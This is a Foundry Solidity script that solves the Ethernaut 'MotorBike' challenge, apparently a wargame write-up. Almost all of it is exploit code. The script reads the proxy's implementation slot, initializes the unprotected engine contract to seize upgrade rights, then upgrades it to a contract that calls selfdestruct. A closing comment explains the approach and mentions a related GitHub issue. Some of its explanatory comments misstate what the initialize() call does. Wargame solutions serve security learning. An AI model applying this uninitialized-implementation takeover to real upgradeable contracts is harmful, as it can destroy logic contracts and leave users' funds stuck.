// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";  // Foundry's scripting utilities

// Main script to solve the MotorBike challenge
contract MotorBikeExploit is Script {

    // Address of the MotorBike proxy contract (replace with your instance address)
    address public motorBikeProxy = 0xYourInstanceAddressHere; 

    // Extract the engine's address from storage slot 0x360... (specific to UUPS proxy pattern)
    address public engineImplementation = address(
        uint160(
            uint256(
                vm.load(
                    motorBikeProxy, 
                    0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                )
            )
        )
    );

    // Payload to call the initialize function of the Engine contract
    bytes public initializePayload = abi.encodeWithSignature("initialize()");

    // Instance of the self-destructing contract
    MotorBikeDestroyer public destroyer;

    // Main function to execute the attack logic
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));  // Start transaction broadcast using PRIVATE_KEY

        // Call the `initialize()` function on the engine implementation
        // This prevents re-initialization protection and ensures the logic contract is unlocked
        engineImplementation.call(initializePayload);

        // Deploy the MotorBikeDestroyer contract (which contains the self-destruct logic)
        destroyer = new MotorBikeDestroyer();

        // Create payload to call the `destroy()` function via `upgradeToAndCall()`
        bytes memory destroyPayload = abi.encodeWithSignature("destroy()");

        //Encode the call to upgrade the engine implementation to the destroyer contract
        // and execute the destroy payload in one go
        bytes memory upgradeAndCallPayload = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", 
            address(destroyer), 
            destroyPayload
        );

        //Execute the `upgradeToAndCall` to take control and trigger self-destruct
        engineImplementation.call(upgradeAndCallPayload);

        vm.stopBroadcast();  // Stop transaction broadcast
    }
}

// Self-destructing contract used to destroy the engine implementation
contract MotorBikeDestroyer {

    // Function to trigger self-destruction of the engine implementation
    function destroy() external {
        selfdestruct(payable(msg.sender));  // Transfer remaining funds and destroy the contract
    }
}

/*
    Explanation:

    In this solution, we exploit the fact that the MotorBike contract uses a UUPS upgradeable proxy. 
    We call `initialize()` to disable the reinitialization guard and then deploy the `MotorBikeDestroyer` contract.
    Using `upgradeToAndCall()`, we upgrade the logic contract to the destroyer contract and immediately call the 
    `destroy()` function to trigger a self-destruct.

    Due to the **deprecation of self-destruct in newer Solidity versions**, only the **funds** will move out, but 
    the **contract code will still remain intact**. This means that the challenge might not get marked as completed 
    on the Ethernaut website UI.

    On the **Ethernaut GitHub repository**, multiple issues have been raised regarding the deprecation of 
    `selfdestruct` and the inability to complete the challenge as expected. As of the date of this solution's 
    submission, the issue has not been resolved.

    Reference: https://github.com/OpenZeppelin/ethernaut/issues/741
*/